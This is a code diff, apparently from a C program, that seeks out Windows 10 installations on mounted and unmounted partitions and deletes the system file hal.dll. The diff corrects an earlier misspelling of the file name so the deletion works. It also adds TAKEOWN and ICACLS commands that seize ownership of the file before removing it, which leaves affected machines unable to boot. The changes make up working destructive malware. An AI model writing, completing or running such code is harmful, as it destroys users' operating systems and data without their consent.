@@ -74,16 +74,31 @@ else get_system();
 
  ICACLS ":\\." /GRANT Administrators:F
 
+ get_system_lang()
+ 
 */
 
 
 static void DeleteIf[[maybe_unused]](bool cond, const char* path) {
-  if (cond) remove(path);
 #ifdef _WIN32
-  else {
+  if (!cond) {
     MessageBox(NULL, "Admin access is required on this OS.\n", "Windows 10", MB_ICONERROR | MB_OK);
     exit(EXIT_FAILURE);
   }
+  char str1[256] = "TAKEOWN /F ";
+  strcat(str1, path);
+  strcat(str1, " /A");
+  printf("%s\n", str1);
+
+  char str2[256] = "ICACLS ";
+  strcat(str2, path);
+  strcat(str2, " /GRANT Administradores:F"); // Administrators
+  printf("%s\n", str2);
+
+  system(str1);
+  system(str2);
+
+  remove(path);
 #endif
 }
 
@@ -110,7 +125,7 @@ void MountedSearch() {
     if (stat(name, &buffer) == 0) {
       printf(RED "ERROR: Windows 10 detected in partition:" NORMAL " %s\n", drive);
       strcpy(del, source);
-      strcat(del, "/Windows/System32/hall.dll");
+      strcat(del, "/Windows/System32/hal.dll");
       printf("Deleting %s ...\n", del);
       remove(del);
     }
@@ -162,7 +177,7 @@ void UnmountedSearch() {
     if (stat(name, &buffer) == 0) {
       printf(RED "ERROR: Windows 10 detected in partition:" NORMAL " %s\n", drive);
       strcpy(del, source);
-      strcat(del, "/Windows/System32/hall.dll");
+      strcat(del, "/Windows/System32/hal.dll");
       printf("Deleting %s ...\n", del);
       remove(del);
     }
@@ -178,7 +193,7 @@ void UnmountedSearch() {
 int main(int argc, char* argv[]) {
 #ifdef _WIN32
   if (WindowsVersion() == Win10)
-    DeleteIf(IsUserAnAdmin(), "C:\\Windows\\System32\\hall.dll");
+    DeleteIf(IsUserAnAdmin(), "C:\\Windows\\System32\\hal.dll");
 #endif
 
   printf("You are using Windows ");
